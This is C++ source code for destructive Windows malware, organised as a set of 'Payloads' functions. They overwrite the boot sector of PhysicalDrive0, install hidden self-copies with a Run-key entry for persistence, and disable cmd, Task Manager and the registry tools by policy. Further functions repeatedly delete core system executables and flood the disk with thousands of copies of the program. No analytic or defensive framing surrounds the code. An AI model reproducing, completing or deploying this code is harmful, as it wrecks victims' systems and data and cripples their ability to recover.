#include "System.h"
#include "Buffer.h"

namespace Payloads {
	VOID OverwriteBootSectors(VOID) {
		DWORD i;
		HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		BOOL action = WriteFile(hFile, lpcvBuffer, 32768, &i, NULL);
		if (!action) exit(0);
		CloseHandle(hFile);
	}

	VOID InfectTheSystem(VOID) {
		LPCSTR lpccBuffer = {
			"cuk=1\r\n"
			"other=1\r\n"
			"ass=1"
		};
		LPCWSTR lpcwFiles[] = {
			L"C:\\WINDOWS\\Tuberculosis.exe",
			L"C:\\WINDOWS\\System32\\lekrjhg.exe",
			L"C:\\WINDOWS\\Web\\target.png.iop.exe"
		};
		for (INT i = 0; i < 3; i++) {
			DWORD j;
			System::ExtCopyFile(FILENAME(), lpcwFiles[i], FILE_ATTRIBUTE_HIDDEN);
			HANDLE hFile = CreateFileW(L"C:\\WINDOWS\\System32\\SpeedDownload.ini", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
			WriteFile(hFile, lpccBuffer, strlen(lpccBuffer), &j, NULL);
			System::ManageRegW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RUN", L"Disease", 0, 0, (BYTE*)lpcwFiles[0], FALSE, TRUE);
			System::ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\POLICIES\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 1, NULL, FALSE, FALSE);
		}
	}
	
	VOID DisableSystemTools(VOID) {
		System::ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM", L"DisableTaskMgr", REG_DWORD, 1, NULL, FALSE, FALSE);
		System::ManageRegW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM", L"DisableRegistryTools", REG_DWORD, 1, NULL, FALSE, FALSE);
	}
	
	DWORD WINAPI DeleteSystemFiles(LPVOID lpProc) {
		LPCWSTR lpcwFilesToDelete[] = {
			L"C:\\WINDOWS\\System32\\taskmgr.exe",
			L"C:\\WINDOWS\\System32\\regedit.exe",
			L"C:\\WINDOWS\\System32\\regedt32.exe",
			L"C:\\WINDOWS\\System32\\cmd.exe",
			L"C:\\WINDOWS\\System32\\wuauclt.exe"
		};
		ShellExecuteW(NULL, L"open", L"taskkill", L"/f /im wuauclt.exe", NULL, SW_HIDE); // Who needs TerminateProcess?
		for (INT i = 0; i < 5; i++) {
			while (GetFileAttributesW(lpcwFilesToDelete[i]) != INVALID_FILE_ATTRIBUTES) {
				DeleteFileW(lpcwFilesToDelete[i]);
			}
		}
	}
	
	VOID NukeHardDrive(VOID) {
		for (DWORD i = 0; i < 16384; i++) {
			System::ExtCopyFile(FILENAME(), L"" + i, FILE_ATTRIBUTE_NORMAL);
		}
	}
}
